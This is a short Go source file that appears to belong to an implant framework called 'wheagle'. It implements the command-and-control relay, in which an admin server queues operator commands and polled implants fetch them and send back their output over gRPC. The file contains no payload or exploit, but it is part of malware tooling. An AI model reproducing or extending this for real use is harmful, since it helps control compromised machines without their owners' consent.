package hb

import (
  "fmt"
  "errors"
  "golang.org/x/net/context"
  "github.com/alphamystic/wheagle/beacon/protos/stream"
)


type implantServer struct{
  work, output chan *stream.Command
}

type adminServer struct{
  work, output chan *stream.Command
}


func NewImplantServer(work, output chan *stream.Command) *implantServer{
  s := new(implantServer)
  s.work = work
  s.output = output
  return s
}

func NewAdminServer(work, output chan *stream.Command) *adminServer{
  s := new(adminServer)
  s.work = work
  s.output = output
  return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *stream.Empty)(*stream.Command,error){
  var cmd = new(stream.Command)
  select{
  case cmd,ok := <- s.work:
    if ok {
      return cmd,nil
    }
    return cmd,errors.New("Channel closed")
  default:
    return cmd,nil
  }
}

func (s *implantServer) SendOutput(ctx context.Context, result *stream.Command)(*stream.Empty,error){
  s.output <- result
  return &stream.Empty{},nil
}

func (s *adminServer) RunCommand(ctx context.Context,cmd *stream.Command) (*stream.Command,error){
  fmt.Println("[+] running command")
  var res *stream.Command
  go func(){
    s.work <- cmd
  }()
  res = <- s.output
  return res,nil
}
